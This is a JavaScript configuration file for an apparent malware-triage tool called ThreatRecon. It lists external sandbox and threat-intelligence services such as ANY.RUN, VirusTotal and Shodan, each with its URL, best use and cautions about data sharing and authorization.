/* ─── Dynamic analysis handoff (manual external links only — no auto-submit) ─ */
export const DYNAMIC_ANALYSIS_CONFIG = {
  summary:
    'ThreatRecon completed local static triage. To observe runtime behavior, detonate the sample in a dedicated malware sandbox.',
  warning:
    'Do not execute suspicious files on your own machine. Use an isolated sandbox or a trusted public malware analysis service. External sandbox links open outside ThreatRecon.',
  reminder:
    'Do not upload sensitive client files or proprietary samples to public sandboxes unless authorized. Use private mode or an internal sandbox for sensitive investigations.',
  services: [
    {
      name: 'ANY.RUN',
      url: 'https://app.any.run/',
      category: 'Interactive Sandbox',
      bestFor: 'Interactive malware behavior analysis',
      useWhen: 'You need to click, interact, watch process behavior, or inspect network connections.',
      caution: 'Public submissions may be visible to other analysts. Use private workspaces when handling sensitive data.',
    },
    {
      name: 'Triage',
      url: 'https://tria.ge/',
      category: 'Automated Sandbox',
      bestFor: 'Fast automated malware reports',
      useWhen: 'You want a quick detonation report and behavioral summary.',
      caution: 'Confirm your organization allows uploading the sample to a third-party service.',
    },
    {
      name: 'Hybrid Analysis',
      url: 'https://www.hybrid-analysis.com/',
      category: 'Automated Sandbox',
      bestFor: 'Public sample reputation and behavioral reports',
      useWhen: 'You want community visibility and existing public reports.',
      caution: 'Public mode shares samples with the community — avoid for confidential investigations.',
    },
    {
      name: 'Joe Sandbox',
      url: 'https://www.joesandbox.com/',
      category: 'Automated Sandbox',
      bestFor: 'Deep commercial sandbox reports',
      useWhen: 'You need detailed behavior, network, and anti-evasion reporting.',
      caution: 'Commercial tiers may apply; verify licensing and data-handling policies.',
    },
    {
      name: 'VirusTotal',
      url: 'https://www.virustotal.com/gui/home/upload',
      category: 'Reputation / Multi-engine Scan',
      bestFor: 'Reputation and multi-engine scanning',
      useWhen: 'You need hash, URL, domain, or file reputation context.',
      caution: 'Uploaded files and hashes may be shared with the vendor community unless private options are enabled.',
    },
  ],
};

/* ─── Sandbox directory (external pivots — open only on analyst click) ──── */
export const SB_DATA = [
  { name: 'ANY.RUN', url: 'https://app.any.run/', category: 'Interactive Sandbox', bestFor: 'Interactive malware behavior analysis', useWhen: 'You need to click, interact, watch process behavior, or inspect network connections.', caution: 'Public submissions may be visible. Use private workspaces for sensitive data.', desc: 'Interactive sandbox with live session control. Useful after static triage to confirm runtime behavior.', tags: ['Interactive', 'Live session'] },
  { name: 'Triage', url: 'https://tria.ge/', category: 'Automated Sandbox', bestFor: 'Fast automated malware reports', useWhen: 'You want a quick detonation report and behavioral summary.', caution: 'Verify authorization before uploading client samples.', desc: 'Automated detonation with clean reports and strong config extraction for common families.', tags: ['Automated', 'Fast reports'] },
  { name: 'Hybrid Analysis', url: 'https://www.hybrid-analysis.com/', category: 'Automated Sandbox', bestFor: 'Public sample reputation and behavioral reports', useWhen: 'You want community visibility and existing public reports.', caution: 'Avoid public mode for confidential investigations.', desc: 'Community and enterprise sandbox with behavioral reports and ATT&CK-aligned output.', tags: ['Community reports', 'ATT&CK'] },
  { name: 'Joe Sandbox', url: 'https://www.joesandbox.com/', category: 'Automated Sandbox', bestFor: 'Deep commercial sandbox reports', useWhen: 'You need detailed behavior, network, and anti-evasion reporting.', caution: 'Check commercial licensing and data-handling policies.', desc: 'Deep behavioral analysis with detailed HTML reports and anti-evasion insight.', tags: ['Deep analysis', 'Commercial'] },
  { name: 'VirusTotal', url: 'https://www.virustotal.com/gui/home/upload', category: 'Reputation / Multi-engine Scan', bestFor: 'Reputation and multi-engine scanning', useWhen: 'You need hash, URL, domain, or file reputation context.', caution: 'Hashes and files may be shared unless private options are enabled.', desc: 'Multi-engine scanning and reputation context for files, hashes, URLs, and domains.', tags: ['Multi-engine', 'Reputation'] },
  { name: 'MalwareBazaar', url: 'https://bazaar.abuse.ch', category: 'Threat Intelligence Pivot', bestFor: 'Hash and sample correlation', useWhen: 'You need related samples, tags, or family context for a hash.', caution: 'Downloading live samples requires a controlled analysis environment.', desc: 'Abuse.ch malware repository for hash lookup, YARA hunting, and sample correlation.', tags: ['Hash lookup', 'abuse.ch'] },
  { name: 'URLScan.io', url: 'https://urlscan.io', category: 'Threat Intelligence Pivot', bestFor: 'URL and domain investigation', useWhen: 'You need screenshots, redirects, and JavaScript behavior for a URL.', caution: 'Scanning may notify the target site — use only when appropriate for your investigation.', desc: 'URL and domain scanning with screenshots, DNS, and page resource analysis.', tags: ['URL analysis', 'Phishing'] },
  { name: 'OTX AlienVault', url: 'https://otx.alienvault.com', category: 'Threat Intelligence Pivot', bestFor: 'Community IOC pulses', useWhen: 'You want pulses and related indicators for a hash, IP, or domain.', caution: 'Community-sourced intelligence requires corroboration.', desc: 'Community threat intelligence with IOC pulses and indicator pages.', tags: ['IOC pulses', 'Community TI'] },
  { name: 'Shodan', url: 'https://shodan.io', category: 'Threat Intelligence Pivot', bestFor: 'Internet-facing host reconnaissance', useWhen: 'You need banners, ports, or certificates for an external IP.', caution: 'Passive recon only — do not probe systems you are not authorized to assess.', desc: 'Search engine for internet-connected devices — useful for C2 and infrastructure pivoting.', tags: ['C2 hunting', 'Banners'] },
];
